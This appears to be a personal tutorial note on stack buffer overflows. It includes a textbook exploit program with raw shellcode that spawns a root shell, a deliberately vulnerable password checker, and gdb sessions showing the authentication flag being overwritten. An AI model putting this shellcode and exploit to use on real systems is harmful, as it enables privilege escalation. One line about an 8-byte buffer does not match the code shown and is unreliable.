How buffer overflows work:

![[Drawing 2023-06-29 10.06.08.excalidraw|8000]]

```ad-important
You need to compile in gcc with the `-fno-stack-protector` flag, for bufferoverflows to work. `-m32`, `-z execstack` can also be useful.
```

An example buffer overflowable code:

```c title:"exploit_notesearch.c"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]= 
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
   unsigned int i, *ptr, ret, offset=270;
   char *command, *buffer;

   command = (char *) malloc(200);
   bzero(command, 200); // zero out the new memory

   strcpy(command, "./notesearch \'"); // start command buffer
   buffer = command + strlen(command); // set buffer at the end

   if(argc > 1) // set offset
      offset = atoi(argv[1]);

   ret = (unsigned int) &i - offset; // set return address

   for(i=0; i < 160; i+=4) // fill buffer with return address
      *((unsigned int *)(buffer+i)) = ret;
   memset(buffer, 0x90, 60); // build NOP sled
   memcpy(buffer+60, shellcode, sizeof(shellcode)-1); 

   strcat(command, "\'");

   system(command); // run exploit
   free(command);
}
```

By inputting anything bigger then 8 bytes into buffer two we can cause the stack to overflow.

A better example might be this:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_authentication(char *password) {
	int auth_flag = 0; // if this flag is 1, or bigger than 0, it's goodsdf
	char password_buffer[16]; // 16 long buffer, this is the issue.

	strcpy(password_buffer, password);

	// set the flag if the password is right.
	if(strcmp(password_buffer, "brillig") == 0)
		auth_flag = 1;
	if(strcmp(password_buffer, "outgrabe") == 0)
		auth_flag = 1;

	return auth_flag;
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage: %s <password>\n", argv[0]);
		exit(0);
	}
	if(check_authentication(argv[1])) {
		printf("\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
		printf("      Access Granted.\n");
		printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
	} else {
		printf("\nAccess Denied.\n");
   }
}
```

There are several issues, here, first of all, the buffer is 16 bytes long and the user data copied into it is not checked, meaning if it’s bigger it overflows the buffer.

Furthermore, the `authflag` is placed in a way that `password_buffer` can easily overwrite it.

Let’s see how we can exploit it.

```bash-output
❯ ./auth_overflow.o aaaa

Access Denied.
```

Well, that didn’t work ofc.

Let’s try adding more `a`:

```bash-output
❯ ./auth_overflow.o aaaaaaaaaaaaaaaaaaaa
[1]    25853 segmentation fault (core dumped)  
```

That’s a `segfault`, we can do better than that.
```bash-output
❯ ./auth_overflow.o aaaaaaaaaaaaaaaaa   

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
```

Why did that work?

```c file:auth_overflow_part.c
int auth_flag = 0; 

char password_buffer[16];
```

We have these two variables, first, `auth_flag` is pushed onto stack, then `password_buffer` is pushed onto the stack. And since `auth_flag` is at a higher address, when we overflow `password_buffer`, it starts writing to the higher address, which is `auth_flag`.

Let’s also look at the check of the `auth_flag`:

```c file:auth_overflow_part.c
if(check_authentication(argv[1])) {
```

We can see that it’s checking for if it’s true. True in C, just means anything non-zero. So this passes whatever `auth_flag` is.

Now let’s boot up `gdb` to see what’s going on.

Let’s put a breakpoint at the `strcpy()` and the `check_auth()` functions, by line number.

Now let’s run it and start examining.

Let’s look at the `password_buffer`:
```gdb
gef➤  x/s password_buffer
0xffffcac0:	"\377\377\377\377\370\315\300\367\200\023\374", <incomplete sequence \367>
```

We can see it’s filled with random uninitialized data, at the address of `0xffffcac0`.

Now let’s look at the `auth_flag`:

```gdb
gef➤  x/x &auth_flag
0xffffcad0:	0x00
```

By inspecting the address it’s at, we can see both the address and the data stored at it. Which is, as we probably could guess, 0.

Now let’s see how many bytes are between the two:

```gdb
gef➤  print 0xffffcad0 - 0xffffcac0
$1 = 0x10
```

16 bytes. So we have to overwrite that.

Let’s examine the password buffer and some bytes after it:

```gdb
gef➤  x/16xw password_buffer
0xffffcac0:	0xffffffff	0xf7c0cdf8	0xf7fc1380	0x00000000
0xffffcad0:	0x00000000	0x56558ff4	0xffffcae8	0x56556278
0xffffcae0:	0xffffce11	0xf7e22e34	0x00000000	0xf7c1f6e9
0xffffcaf0:	0x00000002	0xffffcba4	0xffffcbb0	0xffffcb10
```

we can see that `0x00000000` is at `0xffffcad0`, that’s 16 bytes from `0xffffffff`.

Let’s run till the next break point using `continue`, then let’s check the value of `password_buffer`.

```gdb
gef➤  x/s password_buffer
0xffffcac0:	'A' <repeats 18 times>
```

So it’s filled with `a`. We can see that it says 18 times, even tho the buffer is just 16 bytes long. I THINK, this is because it starts reading the bytes, and only stops at a null string.

But where did that last two bytes go then? Since we don’t have place in the memory for more… Let’s check the `auth_flag`. 

```gdb
gef➤  x/x &auth_flag
0xffffcad0:	0x41
```

We can see that a non-zero value appeared in it, even tho we didn’t change it at all!

```gdb
gef➤  x/16xw password_buffer
0xffffcac0:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffcad0:	0x00004141	0x56558ff4	0xffffcae8	0x56556278
0xffffcae0:	0xffffce11	0xf7e22e34	0x00000000	0xf7c1f6e9
0xffffcaf0:	0x00000002	0xffffcba4	0xffffcbb0	0xffffcb10
```

Now we can see how the buffer filled up the memory!

```gdb
gef➤  continue
Continuing.

-=-=-=-=-=-=-=-=-=-=-=-=-=-
      Access Granted.
-=-=-=-=-=-=-=-=-=-=-=-=-=-
```

aaaand the buffer overflow worked!

